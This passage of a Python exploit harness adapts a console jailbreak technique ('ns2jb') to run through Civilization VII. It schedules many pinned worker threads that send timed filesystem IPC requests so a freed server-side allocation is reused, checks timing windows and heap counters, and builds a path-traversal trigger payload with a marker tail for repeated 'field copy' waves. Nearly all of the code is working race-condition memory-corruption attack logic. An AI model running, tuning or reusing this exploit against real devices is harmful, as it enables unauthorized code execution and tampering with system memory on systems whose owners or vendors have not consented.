            clients = list(cached["clients"])
            self.console.request("write", address=cached["owner_page"],
                                 hex=struct.pack("<I", owner).hex())
        else:
            opened = parse_reply(self.console.request("send", handle=root, packet=packet(200).hex())["hex"])
            assert not opened["result"] and opened["moves"], "storage open failed: " + str(opened["result"])
            storage = opened["moves"][0]
            owner_page = self.console.request("alloc", pages=1)["address"]
            self.console.request("write", address=owner_page, hex=struct.pack("<I", owner).hex())
            if profile.startswith("extent-"):
                # ns2jb sends the trigger on the tmp filesystem, but Civ VII exposes no tmp mount
                # accessor (the full mounts scan finds only name-registry entries for `tmp`). Fall
                # back to the save filesystem so the geometry can still be measured.
                try:
                    trigger_fs = self.mounted_save(self.mount_accessor("tmp"))
                except AssertionError:
                    print("no tmp mount accessor; using the save filesystem for the trigger", flush=True)
                    trigger_fs = fh
                saved_trigger = self._clone_handle(trigger_fs, "tmp-trigger")
            else:
                saved_trigger = self._clone_handle(fh, "saved-trigger")
            trigger_page = self.console.request("alloc", pages=1)["address"]
            self.console.request("write", address=trigger_page, hex=struct.pack("<I", saved_trigger).hex())
            # ns2jb passes the trigger handle as a dynamic `{u32: addr}` so it can switch between
            # the saved and tmp filesystems per wave. The loader that inserts costs a whole extra
            # call BEFORE the send, and the measured window is tick->tick across it: that inflated
            # the trigger's window to ~770 us where the canary's identical lookup is ~333 us, which
            # is why its window would not fit inside the canary's. The handle is known here, so
            # pass it directly (CIV_TRIGGER_DYNAMIC=1 restores ns2jb's form).
            clients = [self._clone_handle(fh, "saved"), storage]
            clients += [self._clone_handle(root, "root") for _ in range(4)]
            clients += [self._clone_handle(fh, "saved") for _ in range(3)]
            clients += [{"u32": owner_page}]
            clients += [self._clone_handle(fh, "saved") for _ in range(2)]
            clients += [{"u32": trigger_page}] if os.environ.get("CIV_TRIGGER_DYNAMIC") else [saved_trigger]
            if os.environ.get("CIV_SACRIFICE"):
                # The deliberate-hole role rides its own saved clone at slot 13: not in
                # held_paths (allPending ignores it), drains after the trigger (its fast
                # miss reply already returned long before), same session class as the canary.
                clients += [self._clone_handle(fh, "sacrifice")]
            assert len(clients) == (14 if os.environ.get("CIV_SACRIFICE") else 13)
            self.state["wave_clients"] = {"clients": clients, "owner_page": owner_page}
        # The protected roles' windows close in client order, not send order (verified: moving the
        # canary's send from 1890 to 2075 us left it the earliest to close, while filler0/filler1/
        # guards/commit closed in ascending slot order). The canary sits at slot 6 -- the first
        # protected slot -- so it always closes first and misses the trigger's end by ~30 us.
        # Slots 6-8 and 10-11 are all identical `saved` clones, so swap the canary to the last
        # protected slot. CIV_CANARY_LAST=0 keeps ns2jb's order for fidelity.
        if os.environ.get("CIV_CANARY_LAST", "1") == "1":
            clients[6], clients[11] = clients[11], clients[6]
        # The trigger sits in the last client slot, and drain order follows slot order -- so a
        # DEFERRED trigger drains last and its end lands behind every protected end, making
        # allPending unreachable for it (that is the "structurally unqualifiable deferred trigger"
        # result). Swapping the trigger into an early protected slot inverts that: a deferred
        # trigger drains first, so trigger.endUs < r.endUs becomes easy, while the
        # startUs < trigger.startUs half is untouched (the trigger's send is at ~2.4 ms regardless,
        # later than every protected start). CIV_SLOT_SWAP=12,6 tests exactly this.
        if os.environ.get("CIV_SLOT_SWAP"):
            first, second = (int(part) for part in os.environ["CIV_SLOT_SWAP"].split(","))
            clients[first], clients[second] = clients[second], clients[first]

        pin_buf = self.console.request("alloc", pages=1)["address"]
        clear_buf = self.console.request("alloc", pages=1)["address"]
        self.state.setdefault("wave_allocs", []).append(pin_buf)
        pre_buf = self.console.request("alloc", pages=1)["address"]
        # CIV_PRE_BRACKET=1: a second counter send right after the preRelease read, INSIDE the
        # same held window. preReleaseUsed has been churn-noisy (24272 … 240 across boots): the
        # game's own save traffic moves counter[5] between the reservation and the mid-wave read,
        # sometimes inverting the gate. The bracket read bounds that drift; the gate uses the
        # min of the two reads (the most conservative "is the reservation still held" estimate).
        pre2_buf = None
        if os.environ.get("CIV_PRE_BRACKET"):
            pre2_buf = self.console.request("alloc", pages=1)["address"]
            self.state.setdefault("wave_allocs", []).append(pre2_buf)
            self.console.request("write", address=pre2_buf, hex=context_bytes(packet(COUNT_OBJECTS), 9).hex())
        # ns2jb opens a persistent storage here (createPin), which blocks behind the hole on
        # Civ VII and delays release -> released -> the trigger. CIV_NO_PIN=1 swaps it for the
        # ordinary counter packet so the release path stays fast while the geometry is tuned.
        pin_packet = packet(COUNT_OBJECTS) if os.environ.get("CIV_NO_PIN") else packet(200)
        pin_early = bool(os.environ.get("CIV_PIN_EARLY"))
        hole_early = bool(os.environ.get("CIV_HOLE_EARLY"))
        release_early = bool(os.environ.get("CIV_RELEASE_EARLY"))
        pre_clone = bool(os.environ.get("CIV_PRE_CLONE"))
        pin_cores = not os.environ.get("CIV_NO_PIN_CORES")
        self.console.request("write", address=pin_buf, hex=context_bytes(pin_packet, 9).hex())
        self.console.request("write", address=clear_buf, hex=context_bytes(packet(COUNT_OBJECTS), 9).hex())
        self.console.request("write", address=pre_buf, hex=context_bytes(packet(COUNT_OBJECTS), 9).hex())

        def call(offset, *args):
            return {"function": sdk + offset, "args": list(args) + [0] * (4 - len(args))}
        def wait(g): return call(SDK_OFFSETS["wait"], g)
        def signal(g): return call(SDK_OFFSETS["signal"], g)
        def sleep_ns(ns): return call(0x168B54, ns)                 # svcSleepThread stub
        def tick(): return call(SDK_OFFSETS["tick"])
        def send(addr, handle): return {"function": sdk + SDK_OFFSETS["send"], "args": [addr, 4096, handle, 0]}
        def copy_word(dst, src): return call(SDK_OFFSETS["memcpy"], dst, src, 4)
        def set_byte(dst): return call(SDK_OFFSETS["memcpy"], dst, OB, 1)
        def guard(decision): return {"function": sdk + SDK_OFFSETS["memcpy"],
                                     "args": [trigger, ZB, {"u32": decision}, 0]}

        # Read the pacing knobs at WAVE time, not import time: leak-cycle's prerequisite sweep
        # mutates os.environ between waves in one process, and module constants would ignore it
        # (review point 2 — CIV_RELEASE_DELAY was a no-op).
        release_delay = int(os.environ.get("CIV_RELEASE_DELAY", RELEASE_DELAY))
        trigger_sleep = int(os.environ.get("CIV_TRIGGER_SLEEP", TRIGGER_SLEEP))
        canary_delay = int(os.environ.get("CIV_CANARY_DELAY", CANARY_DELAY))
        # Gated canary: signal-gated start instead of a fixed absolute delay. Boot 5/7/8/9
        # showed the canary's start tracks the delay 1:1 but its duration relative to the
        # trigger flips regime boot-to-boot, so no constant closes the window. Gating makes
        # the start alignment structural; the offset is then a linear phase knob.
        canary_gated = os.environ.get("CIV_CANARY_GATED") == "1"
        canary_offset = int(os.environ.get("CIV_CANARY_OFFSET_NS", "150000"))
        guard_delay = int(os.environ.get("CIV_GUARD_DELAY", GUARD_DELAY))
        guard_spread = int(os.environ.get("CIV_GUARD_SPREAD", GUARD_SPREAD))
        # CIV_COMMIT_DELAY: ns2jb sends commit at t=0, but a commit request in flight makes the
        # release role's CloseObject(outer) queue behind it and defer to ~3.5-4.5 ms. Delaying
        # commit past the close (but before the trigger) lets the close complete at ~1.0 ms so
        # release-before-trigger holds, while commit still defers with the harvest batch.
        commit_delay = int(os.environ.get("CIV_COMMIT_DELAY", "0"))
        # Deliberate-hole role's send time (CIV_SACRIFICE): early by design — the 0x202
        # miss reply must free the 0x7f1-class copy before the canary's gated dispatch.
        sacrifice_delay = int(os.environ.get("CIV_SACRIFICE_DELAY", "1200000"))
        filler_delays = ([int(x) for x in os.environ["CIV_FILLER_DELAYS"].split(",")]
                         if os.environ.get("CIV_FILLER_DELAYS") else list(FILLER_DELAYS))
        delays = [commit_delay, 300000, 350000, 450000, 550000, 650000, canary_delay,
                  filler_delays[0], filler_delays[1], release_delay]
        # The tails are the only role that fails allPending: sent at 0.35-0.65 ms they return
        # in ~1.4 ms, while the canary sent at 1.7 ms takes ~5 ms. A later send makes them slower
        # (the filesystem is busier), so their deferred seeds can be kept in flight past the
        # trigger. CIV_TAIL_DELAYS="a,b,c,d" sweeps them without editing.
        if os.environ.get("CIV_TAIL_DELAYS"):
            delays[2:6] = [int(part) for part in os.environ["CIV_TAIL_DELAYS"].split(",")]
        # allPending needs every protected role (commit, tails, canary, fillers) to still be in
        # flight when the trigger fires. CIV_PROTECT_SHIFT=<ns> pushes all of them later together
        # so their windows can be moved under the trigger's.
        shift = int(os.environ.get("CIV_PROTECT_SHIFT", "0"))
        if shift:
            for index in (0, 2, 3, 4, 5, 6, 7, 8):
                delays[index] += shift
        plans = []
        for i, role in enumerate(roles):
            steps = [wait(gate["master"])]
            if i == 9 and release_early:
                # Signal `released` BEFORE the role's own sleep. Appending it after
                # sleep_ns(RELEASE_DELAY) coupled the release pacing into the guards
                # (wait on `released`) and the trigger (wait `released` + `guard` + 400 us):
                # raising RELEASE_DELAY 1.5 -> 2.5 ms moved the trigger's start 2.4 -> 3.4 ms
                # (runs of 20:47/20:49). Signalling first decouples the trigger's start
                # from RELEASE_DELAY entirely; the sleep still paces the counter sends.
                steps.append(signal(gate["released"]))
            if i == 1 and hole_early:
                # The hole's send blocks for the whole receive on Civ VII, so its normal
                # post-send holeDone would make the trigger sample completedFlag only after
                # every protected request finished. Signal it up front instead.
                steps.append(signal(gate["holeDone"]))
            if i < 10:
                if i == 6 and canary_gated:
                    # Gated canary: wait for guard1's canaryGate signal instead of the fixed
                    # sleep_ns(delays[6]). guard1 signals canaryGate after guard, so the
                    # canary wakes within us of the trigger's wait(gate["guard"]) release;
                    # the offset sleep phase-shifts it relative to the trigger's start.
                    steps.append(wait(gate["canaryGate"]))
                    if canary_offset:
                        steps.append(sleep_ns(canary_offset))
                else:
                    steps.append(sleep_ns(delays[i]))
            elif i < 12:
                # NB: not shifted. guard1 signals `gate[guard]` before its send, which gates the
                # trigger, so shifting the guards would move the target as well.
                steps += [wait(gate["released"]), sleep_ns((i - 10) * guard_spread + guard_delay)]
            elif i == 12:
                # The fold needs the trigger's window INSIDE the tails' windows, so this sleep is
                # the knob that places it: too late (ns2jb's 2.4 ms) and the seeds have already
                # returned; too early and the guards have not signalled. CIV_TRIGGER_SLEEP tunes it.
                # CIV_TRIGGER_TAIL: the post-gate sleep is structural for the guards' end margin —
                # guards' end − trigger end = w_guards − TAIL − w_trigger, independent of
                # GUARD_DELAY (round-22 analysis). ns2jb's 400 µs makes the guards need
                # w_guards > 400 µs + w_trigger; cutting TAIL to ~100 µs covers the whole
                # mid-class trigger service under the real (closing) release geometry.
                steps += [sleep_ns(trigger_sleep), wait(gate["released"]), wait(gate["guard"])]
                if os.environ.get("CIV_RELEASE_CLOSE_GATE"):
                    # The alias chain needs the reservation's release to have CLOSED before the
                    # trigger's lookup runs (the trigger reuses the freed canary slot). The
                    # `released` handshake can be signalled early (CIV_RELEASE_EARLY), so wait on
                    # the close itself. Review 4.4: close_gap = release.endUs - trigger.startUs.
                    steps += [wait(gate["closed"])]
                steps += [sleep_ns(int(os.environ.get("CIV_TRIGGER_TAIL", "400000"))),
                          copy_word(SD, HF)]
            else:
                # CIV_SACRIFICE (role 13, the deliberate hole): sleep + send only — no
                # gates, no CF byte, not protected. The role sends EARLY (default 1.2 ms,
                # CIV_SACRIFICE_DELAY) so its 0x202 miss reply frees the 0x7f1-class
                # server-side copy BEFORE the canary's ~2.41 ms gated dispatch and well
                # before the trigger: a same-class hole the canary's copy can reuse.
                # not in held_paths: allPending/changedPaths/nativeGuard all ignore it.
                steps += [sleep_ns(sacrifice_delay)]
            if i == 9:
                # Only the pin is moved; clearReport and preRelease stay in the release role.
                # Sends on the base `root` session block behind the hole (~60 ms); the tail roles
                # run on *clones* of root and complete during it. CIV_PRE_CLONE=1 routes the
                # counter reads through a clone so preRelease is sampled while memory is held.
                # BUGFIX (external review): clients[5] is tail3's session — the release role's
                # counter sends queued BEHIND tail3's deferred lookup on the same session, so
                # the preRelease read was sampled after most roles had returned (the 240-byte
                # readings = tail0+tail2 only). Use a DEDICATED clone no role shares.
                if not self.state.get("release_target"):
                    self.state["release_target"] = self._clone_handle(root, "release-counter")
                target = self.state["release_target"] if pre_clone else root
                steps += [] if pin_early else [tick(), send(pin_buf, target), tick()]
                steps += [tick(), send(clear_buf, target), tick(),
                          tick(), send(pre_buf, target), tick()]
                if pre2_buf is not None:
                    steps += [tick(), send(pre2_buf, target), tick()]
            if i == 11:
                steps += [copy_word(EH, HF), signal(gate["guard"])]
                if canary_gated:
                    # Gated canary: a second signal AFTER guard. Two roles never wait on the
                    # same gate, so a single-wake signal cannot be stolen by another waiter.
                    steps.append(signal(gate["canaryGate"]))
            if i == 12:
                steps += [copy_word(CD, CF), copy_word(HD, EH),
                          guard(CD), guard(HD), guard(SD)]
            steps += [tick(), send(requests[role], clients[i]), tick()]
            if i == 1:
                steps += [set_byte(HF)] if hole_early else [set_byte(HF), signal(gate["holeDone"])]
            if i == 9 and os.environ.get("CIV_RELEASE_CLOSE_GATE"):
                # Sent after the close_object(outer) send above, so the trigger can order itself
                # strictly after the free regardless of when `released` fired.
                steps.append(signal(gate["closed"]))
            if i == 9 and not release_early:
                steps.append(signal(gate["released"]))
            if i == 0 or 2 <= i <= 8 or i in (10, 11):
                steps.append(set_byte(CF))
            if i == 0 and pin_early:
                # OpenStorage blocks ~11 ms while the hole's receive is in flight. Issuing it
                # last in the commit worker keeps it off every critical path (the commit's own
                # request and the release->released handshake) at the cost of it finishing
                # outside the canary window.
                steps.append(send(pin_buf, root))
            plans.append(steps)

        # ns2jb pins each worker to one core, cycling through the available set (affinity.cjs).
        # CIV_PIN_OFFSET=<n> rotates the map: the one standing correlation left on tail3 (0/12+
        # deferral after opcode, delay, slot, path shape, piece content, handle and descriptor
        # size were all eliminated) is its core pin — index 5 -> core 1, the same core as the
        # hole and the release role. Rotating moves tail3 (and every other role) one core over;
        # if deferral follows the core, tail3 defers and tail2 stops.
        pin_offset = int(os.environ.get("CIV_PIN_OFFSET") or 0)
        # CIV_PIN_MAP="0,1,2,..." (13 entries, role order) overrides the modular map entirely:
        # the sweep showed the trigger is fast on core 0 (uncontended) while tail1 only deferred
        # on core 0 in the offset-1 arrangement — properties no single rotation provides together.
        pin_map = None
        if os.environ.get("CIV_PIN_MAP"):
            pin_map = [int(part) for part in os.environ["CIV_PIN_MAP"].split(",")]
            assert len(pin_map) == len(roles), "CIV_PIN_MAP needs one entry per role"
        launched = [self._launch_frame(steps, core=(pin_map[index] if pin_map else
                    ((index + pin_offset) % 4)) if pin_cores else None)
                    for index, steps in enumerate(plans)]
        self.console.request("call", address=sdk + SDK_OFFSETS["signal"], args=[gate["master"], 0, 0])
        results = [self._poll_results(base, proof, timeout_s=6.0) for base, proof in launched]
        rows = []
        for i, role in enumerate(roles):
            raw = self.console.request("read", address=requests[role], length=256)["hex"]
            try:
                reply = parse_reply(bytes.fromhex(raw), data_size=64)
                data = reply.get("data") or b""
                rows.append({"role": role, "result": reply["result"],
                             "canonical": reply["canonical"],
                             "type": struct.unpack_from("<I", data, 0)[0] if len(data) >= 4 else None,
                             "inline": data[:16].hex(), "hex": raw[:64]})
            except Exception as exc:                        # noqa: BLE001
                rows.append({"role": role, "parseError": str(exc), "hex": raw[:64]})
            rows[-1]["slots"] = results[i]
        native = {name: struct.unpack("<I", bytes.fromhex(self.console.request(
            "read", address=addr, length=4)["hex"]))[0]
            for name, addr in (("completed", CD), ("earlyHole", HD), ("minimumSpacing", SD))}

        # Timing: a role's IPC step is the only slot small enough not to be a cntvct value, so
        # the surrounding tick slots give its start/end. Matches ns2jb's startUs/endUs rows.
        freq = self.console.request("status")["tickFrequency"] or 1
        timing = {}
        send_addr = sdk + SDK_OFFSETS["send"]
        tick_addr = sdk + SDK_OFFSETS["tick"]
        for index, role in enumerate(roles):
            slots = results[index]
            # Locate the IPC step from the frame's own expanded call list. Guessing from slot
            # values fails because a dynamic handle argument inserts a loader call, so the slot
            # before the send is the loader's pointer return rather than the preceding tick.
            kinds = (launched[index][1] or {}).get("functions") or []
            # The release role has FOUR sends (pin?, clear, pre, pre2, closeObject(outer)); the
            # meaningful window for its close is the LAST send, not the first (which is the
            # counter read). Everything else has a single send.
            if role == "release":
                at = next((k for k in range(len(kinds) - 1, -1, -1) if kinds[k] == send_addr), None)
            else:
                at = next((k for k, fn in enumerate(kinds) if fn == send_addr), None)
            if at is None or at >= len(slots):
                continue
            before_tick = next((slots[k] for k in range(at - 1, -1, -1)
                                if k < len(kinds) and kinds[k] == tick_addr), None)
            after_tick = next((slots[k] for k in range(at + 1, len(slots))
                               if k < len(kinds) and kinds[k] == tick_addr), None)
            timing[role] = {"transport": slots[at], "startTick": before_tick, "endTick": after_tick}
        # Origin = the EARLIEST role start, not commit's (roles[0]). CIV_PROTECT_SHIFT moves
        # commit later than the hole/release, which would make their startUs negative and force
        # timing_valid=False even when every role spans the trigger (external review, point 3).
        _origin_ticks = [r["startTick"] for r in timing.values()
                         if r.get("startTick") is not None]
        origin = min(_origin_ticks) if _origin_ticks else None
        for row in timing.values():
            if origin and row.get("startTick"):
                row["startUs"] = (row["startTick"] - origin) * 1e6 / freq
                row["endUs"] = (row["endTick"] - origin) * 1e6 / freq
        protected_roles = ["commit", "tail0", "tail1", "tail2", "tail3", "canary",
                           "filler0", "filler1", "guard0", "guard1"]
        trigger_row = timing.get("trigger", {})
        # Guard against a broken extraction. If the slot search fails to find a role's real
        # surrounding ticks it can fall back to a raw cntvct, which lands in startUs as ~1e9 us.
        # A bogus huge trigger startUs makes every role trivially start "before" it, so allPending
        # passes VACUOUSLY. The two preserved artifacts runs/worker-wave-extent-present-QUALIFIED*.json
        # qualify for exactly that reason and are PHANTOMS -- not evidence of a qualifying run.
        SANE_US = 1e6
        timing_valid = True
        for _row in timing.values():
            _s, _e = _row.get("startUs"), _row.get("endUs")
            if _s is None or _e is None:
                continue
            if not (0 <= _s < SANE_US and 0 <= _e < SANE_US and _e >= _s):
                timing_valid = False
        try:
            all_pending = timing_valid and all(timing[r]["startUs"] < trigger_row["startUs"]
                              and trigger_row["endUs"] < timing[r]["endUs"] for r in protected_roles)
            receive_margin = timing["hole"]["endUs"] - timing["guard1"]["startUs"]
        except KeyError:
            all_pending, receive_margin = None, None
        try:
            pre = parse_reply(bytes.fromhex(self.console.request("read", address=pre_buf, length=256)["hex"]))
            pre_counters = [struct.unpack_from("<Q", pre["data"], 8 * k)[0] for k in range(16)]
            pre_reads = [pre_counters[5]]
            if pre2_buf is not None:
                pre2 = parse_reply(bytes.fromhex(self.console.request("read", address=pre2_buf, length=256)["hex"]))
                if not pre2["result"] and len(pre2.get("data") or b"") >= 48:
                    # A failed bracket read (empty data) would poison min() with a near-zero
                    # counter and collapse preReleaseUsed (observed: 272 vs 40816 same boot).
                    pre_reads.append(struct.unpack_from("<Q", pre2["data"], 40)[0])   # counter[5] = 5*8
            held = self.state.get("held")
            # min over the bracket: the most conservative "still held" estimate when the game's
            # own allocations/free churn counter[5] between the reservation and the mid-wave read.
            pre_used = (held[5] - min(pre_reads)) if held else None
        except Exception:                                        # noqa: BLE001
            pre_counters, pre_used = None, None
        report = {"profile": profile, "rows": rows, "nativeGuard": native,
                  "triggerAborted": bool(any(native.values())),
                  "timing": timing, "allPending": all_pending, "timingValid": timing_valid,
                  # The full knob set for this run: post-hoc forensics across runs is otherwise
                  # guesswork (ns2jb records workerDelaysNs for the same reason).
                  "config": {k: v for k, v in sorted(os.environ.items()) if k.startswith("CIV_")},
                  "receiveOrderMarginUs": receive_margin, "preReleaseUsed": pre_used,
                  "results": [row[-1] for row in results]}
        # ns2jb's fifth hasWindow term: the general-heap counters return to the pre-reservation
        # value once the group is released (`after[5] + (createPin ? 13616 : 0) === before[5]`).
        # Control measurement: the game's own heap moves while no wave is running, so a bare
        # equality check (ns2jb) is not meaningful inside a live game process. Sample the churn
        # over a comparable interval and use it as the tolerance band.
        try:
            churn_a = self.counters(self.cached_session("counters_handle", "wave-churn-a"))
            time.sleep(0.3)
            churn_b = self.counters(self.cached_session("counters_handle", "wave-churn-b"))
            churn = churn_a[5] - churn_b[5]
        except Exception:                                       # noqa: BLE001
            churn = None
        try:
            after = self.counters(self.cached_session("counters_handle", "wave-after"))
            before = self.state.get("before")
            delta = (after[5] - before[5]) if before else None
            tolerance = max(4 * abs(churn or 0), 0x10000)
            restored = None if delta is None else abs(delta) <= tolerance
            restored_detail = {"before": before[5] if before else None, "after": after[5],
                               "delta": delta, "churn": churn, "tolerance": tolerance}
        except Exception as exc:                                # noqa: BLE001
            restored, restored_detail = None, {"error": str(exc)}
        # preReleaseHeldFreed: how much the mid-wave release FREED, measured as the counter drop
        # between the pre-release read and the post-release read. Unlike preReleaseUsed (held −
        # pre, which the game's own save-traffic churn dominates — readings 40816 … 208 across
        # boots), the drop is churn-independent when the two reads bracket tightly: if the group
        # was still held at release, the drop ≈ the measured allocation (~12160); if it was
        # already gone, the drop ≈ 0. Civ-re-derived replacement candidate for the 0x2600 gate.
        try:
            # SIGN (verified round-21): counter[5] is free bytes; the release FREES the group, so
            # after[5] > pre[5] and a positive value = bytes freed by the release. Observed live:
            # +8400/+21952 once the group actually closed (was -6752-ish measuring object-1's
            # closure). The threshold then means "the group's worth of memory was freed".
            report_preReleaseHeldFreed = (after[5] - pre_counters[5]) if (pre_counters and after) else None
        except Exception:                                    # noqa: BLE001
            report_preReleaseHeldFreed = None
        if os.environ.get("CIV_HELD_GATE"):
            # Gate on the churn-free metric with a Civ-re-derived threshold: heldFreed is stable
            # at 6400-6800 when the group was held (vs 0x2600 = 9728 in ns2jb's metric space).
            pre_used = report_preReleaseHeldFreed
            held_min = int(os.environ.get("CIV_HELD_MIN", "6000"), 0)
            if pre_used is not None:
                pre_used = pre_used if pre_used >= held_min else 0
            report["preReleaseUsed"] = pre_used             # the dict captured the pre-gate value
        # ns2jb's placement instrumentation: a held path is "changed" when its result departs from
        # the expectation (canary -> 0 with inline type 1; fillers/guards -> 0x202). This is the
        # only signal that says WHERE an aliased copy landed, versus only whether the gates held.
        held_paths = ("canary", "filler0", "filler1", "guard0", "guard1")
        # The canary's expected result depends on its staging form: the short form resolves to the
        # real canary file (result 0, inline type 1) while CIV_NORMALIZED_PATHS pads it into a
        # MISSING path (result 0x202, type 0). Comparing against a fixed 0/type-1 expectation makes
        # every normalized run report changedPaths=['canary'] -- a false overwrite signal that looks
        # exactly like a real aliased write. Parameterise it.
        # The canary now RESOLVES in every staging form (short, depth chain, or normalized-with-
        # created-chain — ns2jb-faithful per pass-4 review): its expected result is 0 / type 1 in
        # all cases. The old 0x202 expectation encoded the missing-chain bug, and fired falsely
        # whenever CIV_NORMALIZED_PATHS was combined with CIV_CANARY_DEPTH.
        canary_expected = 0
        changed = []
        for entry in rows:
            role = entry["role"]
            if role not in held_paths:
                continue
            expected = canary_expected if role == "canary" else 0x202
            if entry.get("canonical") != expected:
                changed.append(role)
            elif role == "canary" and canary_expected == 0 and entry.get("type") not in (None, 1):
                changed.append(role)
        report["changedPaths"] = changed
        report["canaryChanged"] = "canary" in changed
        # ns2jb's discipline (probe-reserved-gap.cjs): a changed canary WITHOUT a qualifying window
        # means the placement is uncertain -- save, stop, retain for recovery. Never retry an
        # overwrite blind. Recorded rather than acted on here, because our waves are read-only
        # unless CIV_ALLOW_OVERWRITE is set.
        report["placementUncertain"] = bool("canary" in changed and not report.get("allPending"))
        report["preReleaseHeldFreed"] = report_preReleaseHeldFreed
        report["canaryType"] = next((e.get("type") for e in rows if e["role"] == "canary"), None)
        report["triggerInline"] = next((e.get("inline") for e in rows if e["role"] == "trigger"), None)
        report["selectedMarker"] = bool(next((e for e in rows if e["role"] == "trigger"), {})
                                        .get("canonical") == 0
                                        and (next((e for e in rows if e["role"] == "trigger"), {})
                                             .get("type") == 1))
        report["restored"] = restored
        report["restoredDetail"] = restored_detail
        # The held threshold follows the metric: CIV_HELD_MIN (default 6000) for the heldFreed
        # scale, ns2jb's 0x2600 for the raw churn-dominated counter delta.
        held_threshold = int(os.environ.get("CIV_HELD_MIN", "6000"), 0) \
            if os.environ.get("CIV_HELD_GATE") else 0x2600
        report["windowOk"] = bool(all_pending is True and not any(native.values())
                                 and (receive_margin or 0) >= 300 and (pre_used or 0) >= held_threshold
                                 and restored is not False)
        report = {**report, "scratch": self.scratch,
                  "gates": {"master": gate["master"], "holeDone": gate["holeDone"],
                            "released": gate["released"], "guard": gate["guard"],
                            "closed": gate["closed"], "canaryGate": gate["canaryGate"]},
                  "owner": owner, "outer": outer, "clients": clients}
        RUNS.mkdir(exist_ok=True)
        path = RUNS / ("worker-wave-%s.json" % profile)
        path.write_text(json.dumps(report, indent=2, default=str) + "\n")
        report["file"] = str(path)
        return report

    FIELD_COPIES = 2
    MINIMUM_CACHE_HELD = 0x2810

    def copy_field_wave(self, tail, name, required_copies=None, read_size=None):
        """ns2jb probe-reserved-gap.cjs copyField(tail, name, requiredCopies): run waves whose
        trigger input is '/..\\' + 'B' fill + tail at MARKER_OFFSET + NUL, accepting a wave when
        hasWindow && preReleaseUsed >= minimumCacheHeld && changedPaths is empty. Retry in
        batches of requiredCopies * 3 attempts, counting accepted windows without requiring
        consecutive placement; throw after a full batch without enough confirmations."""
        required_copies = self.FIELD_COPIES if required_copies is None else required_copies
        assert (isinstance(required_copies, int) and 1 <= required_copies <= self.FIELD_COPIES), \
            "Invalid number of field-copy controls"
        tail = bytes(tail)
        payload = bytearray(b"B" * (MARKER_OFFSET + len(tail) + 1))
        payload[0:4] = b"/..\\"
        payload[MARKER_OFFSET:MARKER_OFFSET + len(tail)] = tail
        payload[-1] = 0
        # Acceptance must follow the metric worker_wave actually reported. Under CIV_HELD_GATE=1
        # preReleaseUsed is the churn-free heldFreed value on the CIV_HELD_MIN scale (Civ:
        # ~5300-5400 bytes), NOT the raw counter delta whose ns2jb threshold is 0x2810 —
        # comparing that value against 0x2810 makes `accepted` permanently False (review 3.3).
        if os.environ.get("CIV_HELD_GATE"):
            held_threshold = int(os.environ.get("CIV_HELD_MIN", "6000"), 0)
        else:
            held_threshold = self.MINIMUM_CACHE_HELD
        for batch in range(10000):
            confirmed = 0
            for attempt in range(required_copies * 3):
                if confirmed >= required_copies:
                    break
                # Every wave's release role closes the reserved group (self.state["outer"]),
                # and worker_wave(tries=1) never re-reserves. Without this, the second and later
                # field-copy waves run on an already-released group (closing a stale outer id)
                # and leak ~100 console pages each (review 3.1). If nothing is mounted yet,
                # worker_wave's own setup() reserves the first group instead.
                if self.state.get("mounted"):
                    self.rereserve()
                    allocs = self.state.get("wave_allocs") or []
                    if allocs:
                        try:
                            self.console.request("freeAddresses", addresses=allocs)
                        except Exception:
                            pass
                    self.state["wave_allocs"] = []
                row = self.worker_wave("cache-%s-%d-%d" % (name, batch, attempt),
                                       payload=bytes(payload), read_size=read_size)
                accepted = (row.get("windowOk") is True
                            and (row.get("preReleaseUsed") or 0) >= held_threshold
                            and len(row.get("changedPaths") or []) == 0)
                if accepted:
                    confirmed += 1
            if confirmed >= required_copies:
                return {"name": name, "confirmed": confirmed, "batches": batch,
                        "payload": bytes(payload).hex()}
        raise AssertionError("Field copy did not qualify within its attempt limit: " + name)


if __name__ == "__main__":
    import sys

    args = sys.argv[1:]
    host = DEFAULT_HOST
    if len(args) >= 2 and args[0] == "--host":
        host = args[1]
        args = args[2:]
    if args and args[0] == "load":
        load_console(host)
        raise SystemExit(0)
    try:
        harness = Harness(host=host)
    except (ConnectionRefusedError, OSError) as exc:
        raise SystemExit(
            "cannot reach the harness on %s:%d (%s).\n"
            "The loader evaluates one payload per boot. Unload the relocation payload\n"
            "  python ../relocation/host/relocate_host.py %s stop\n"
            "then load this one:\n"
            "  python host.py --host %s load"
            % (host, CONTROL_PORT, exc, host, host))
    if not args:
        print(json.dumps({"status": harness.console.request("status"),
                          "relocate": harness.console.request("relocate")}, indent=2))
    elif args[0] == "setup":
        print(json.dumps(harness.setup(reserve="--reserve" in args), indent=2))
    elif args[0] == "leak-read":
        print(json.dumps(harness.leak_read(int(args[1]) if len(args) > 1 else 8), indent=2))
    elif args[0] == "reserve":
        print(json.dumps(harness.reserve_group("gap"), indent=2))
    elif args[0] == "mounts":
        print(json.dumps(harness.discover_mount(), indent=2))
    elif args[0] == "worker":
        print(json.dumps(harness.worker_test(), indent=2))
    elif args[0] == "posttest":
        print(json.dumps(harness.post_test(), indent=2))
    elif args[0] == "worker-chain":
        print(json.dumps(harness.worker_chain(), indent=2))
    elif args[0] == "worker-marker":
        print(json.dumps(harness.worker_marker(), indent=2))
    elif args[0] == "worker-send":
        print(json.dumps(harness.worker_send(), indent=2))
    elif args[0] == "gate-worker":
        print(json.dumps(harness.gate_worker(), indent=2))
    elif args[0] == "gate-test":
        print(json.dumps(harness.gate_test(), indent=2))
    elif args[0] == "guard-test":
        print(json.dumps(harness.guard_test(), indent=2))
    elif args[0] == "fold-workers":
        print(json.dumps(harness.fold_workers(), indent=2))
    elif args[0] == "fold-check":
        print(json.dumps(harness.fold_check(), indent=2))
    elif args[0] == "slash-check":
        print(json.dumps(harness.slash_check(), indent=2))
    elif args[0] == "affinity-test":
        print(json.dumps(harness.affinity_test(), indent=2))
    elif args[0] == "worker-minimal":
        print(json.dumps(harness.worker_minimal(), indent=2))
    elif args[0] == "worker-direct":
        print(json.dumps(harness.worker_direct(int(args[1]) if len(args) > 1 else 1), indent=2))
    elif args[0] == "worker-wave":
        print(json.dumps(harness.worker_wave(args[1] if len(args) > 1 else "abort-control",
                                             int(args[2]) if len(args) > 2 else 1), indent=2))
    elif args[0] == "wave" and len(args) == 2:
        harness.setup(reserve=True)          # scratch tree, paths, and the wrapped outer
        print(json.dumps(harness.run(args[1]), indent=2))
    else:
        raise SystemExit("usage: host.py [--host <ip>] [load | setup | wave <profile>]")
